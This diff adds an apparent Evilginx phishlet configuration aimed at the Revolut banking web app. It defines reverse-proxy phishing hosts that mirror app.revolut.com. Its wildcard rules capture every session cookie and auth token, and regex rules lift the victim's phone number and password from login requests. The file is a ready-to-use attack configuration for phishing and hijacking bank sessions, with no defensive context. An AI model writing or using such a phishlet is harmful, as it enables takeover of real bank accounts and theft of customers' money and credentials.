@@ -1,0 +1,34 @@
+author: '@charlesbel'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'app', orig_sub: 'app', domain: 'revolut.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'revolut.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'app.revolut.com', orig_sub: 'app', domain: 'revolut.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'app.revolut.com', orig_sub: 'app', domain: 'revolut.com', search: 'application/json;charset=utf-8', replace: 'application/json', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'app.revolut.com', orig_sub: 'assets', domain: 'revolut.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: 'app.revolut.com'
+    keys: ['.*,regexp']
+  - domain: '.revolut.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/accounts'
+  - '/api/retail/user/current'
+
+credentials:
+  username:
+    key: ''
+    search: '"phone":"([^"]*)"'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)"'
+    type: 'json'
+
+login:
+  domain: 'app.revolut.com'
+  path: '/start'
